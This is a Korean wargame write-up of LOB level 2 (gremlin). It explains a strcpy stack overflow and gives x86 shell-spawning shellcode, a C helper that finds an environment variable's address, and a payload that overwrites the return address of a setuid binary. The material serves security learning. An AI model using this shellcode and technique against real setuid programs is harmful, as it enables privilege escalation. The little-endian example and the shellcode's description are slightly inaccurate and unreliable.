---
title: BOF/ LOB-level2(gremlin)
tags: LOB
---

LOB란 The Lord of the BOF의 약자로 Buffer over-flow를 연습해 볼 수 있는 해킹문제이다.    
총 20문제로 구성되어 있으며 각 문제를 격파하여 다음 레벨의 패스워드를 얻는 형식입니다.  
문제를 격파하고 다음 레벨의 bash를 획득하였다면 my-pass로 패스워드를 확인할 수 있습니다.  

 [send me email](mailto:jewel7492@gmail.com) if you have any questions.

<!--more-->

---
### LOB Level 2(gremlin)
**ID : gremlin**  
**PASSWD : hello bof world**         

```bash
$ bash2
```
풀이 시작 전에 bash2로 꼭 변경  
**bash는 \xff를 \x00(NULL)로 인식하여 제대로 문제를 풀 수 없다.**  

![그림1](/assets/LOB/level2/1.PNG)  
사용자 cobolt의 권한의 cobolt파일이 있음을 확인할 수 있다.  
**set-uid가 걸려있으므로 사용자 cobolt의 권한으로 파일을 실행할 수 있다.**  
**cobolt파일이 쉘을 실행시키도록 한다면 사용자 cobolt의 쉘을 획득할 수 있다.**  

<br />
{% highlight C linenos %}  
/*
        The Lord of the BOF : The Fellowship of the BOF
        - cobolt
        - small buffer
*/

int main(int argc, char *argv[])
{
    char buffer[16];
    if(argc < 2){
        printf("argv error\n");
        exit(0);
    }
    strcpy(buffer, argv[1]);
    printf("%s\n", buffer);
}
{% endhighlight %}  

**cobolt.c**

### 소스분석  
1. buffer의 크기가 16Byte이다.  
[LOB(level1)](https://limjunho.github.io/2019/09/29/LOB-level1(gate).html)**와 같이 쉘코드를 사용하기엔 buffer의 크기가 작다.**  
2. argc가 2보다 작다면 "ergv error"을 출력하고 프로그램을 종료한다.  
**argc란? - 파라미터의 개수를 의미한다. 즉 main에 최소 2개이상의 인자를 전달하여야 한다.**  
3. main에 전달받은 인자 argv[1]을 buffer에 복사하여 출력하는 소스(argv[0]은 파일명)  
**strcpy함수는 복사할 데이터의 크기제한이 없기 때문에 argv[1]이 16Byte보다 크다면 buffer-overflow가 발생하는 취약점이 있다.**  

### Solution  
**환경변수에 쉘코드를 등록하고 환경변수의 주소를 buffer over-flow시켜 프로그램이 쉘코드를 실행하도록 공격한다.**  
what is 환경변수? - 프로세스가 컴퓨터에서 동작하는 방식에 영향을 미치는 동적인 값들의 모임으로 쉘에서 정의되고 실행하는 동안 프로그램에 필요한 변수를 나타냄.  

#### level2에서 사용한 쉘코드  
**\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80**  
이 41Byte 쉘코드는 /bin/bash를 실행시키도록 하는 코드이다.  

![그림2](/assets/LOB/level2/2.PNG)  
**위와같이 환경변수에 쉘코드를 등록한다**  

**buffer over-flow를 이용하기 위해서는 프로그램 Stack의 구조를 알아야 한다.**  

스택구조|
---|
buffer(16Byte)|
sfp(4Byte)|
ret(4Byte)| 

**SFP(Stack frame pointer) - 이전 함수의 EBP주소를 담고 있다.**  
(EBP - 스택의 가장 바닥을 가리키는 포인터)  
**RET(Return Address) - 함수가 종료시 return될 주소**  

#### 쉘코드의 주소를 ret에 덮어씌우면 main함수가 종료되며 쉘코드를 실행시킬 것이다.  

### 환경변수 주소    

**환경변수의 주소를 얻는 프로그램을 코딩**  
<br />
{% highlight C linenos %}  
/* 환경변수의 주소는 bf로 시작한다 즉, 프로그램이 실행되면 환경변수의 데이터들이 스택 어딘가에 들어간다.
   따라서 프로그램 이름의 길이나 명령어의 길이등에 따라 환경변수의 주소가 바뀐다.
   아래의 소스는 정확한 주소를 획득할 수 있다. */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char* argv[]){
    char* ptr;
    
    ptr = getenv(argv[1]);
    ptr += (strlen(argv[0]) - strlen(argv[2])) * 2;
    // argv[0]=./getenv	argv[2]=타깃 바이너리의 절대경로
    printf("%s will be at %p\n", argv[1], ptr);

    return 0;
}
{% endhighlight %} 
![그림3](/assets/LOB/level2/3.PNG)  
**첫 번째 인자는 환경변수 이름, 두 번째 인자는 타깃 파일의 절대경로이다.**  

### Attack  

환경변수의 주소와 스택의 구조를 파악하였으므로 공격을 시도할 수 있다.  
**./gremlin [dummy값] + [환경변수주소]**의 형태로 공격.  
**이 때 dummy값의 길이는 buffer의 길이 + sfp(4byte)만큼 즉 20Byte여야 한다.**
**또한 RET에 덮을 쉘코드의 주소는 리틀 엔디안 방식으로 기입한다.**  

**리틀 엔디안은 최 하위 바이트 부터 저장하는 방식이다.**  
ex) 0xbffffc11을 리틀 엔디안 방식으로 저장하면 11cfffbf가 된다.  
보통 엔디안 방식은 CPU 아키텍쳐에 따라 다르지만 intel x86, x64, AMD 계열은 리틀엔디안, 모토로라 프로세서들은 빅엔디안을 사용한다.  
현재 시스템의 엔디안방식을 확인하고 싶다면 echo -n I | od -to2 | head -n1 | awk'{print $2;}' | cut -c6  
명령으로 나오는 값이 1이라면 리틀 엔디안, 0이라면 빅엔디안이다.  

![그림4](/assets/LOB/level2/4.PNG)  
공격 성공.   

**페이로드**  
```bash
$ ./cobolt `python -c "print 'A' *20 + '\xbb\xfe\xff\xbf'"`
```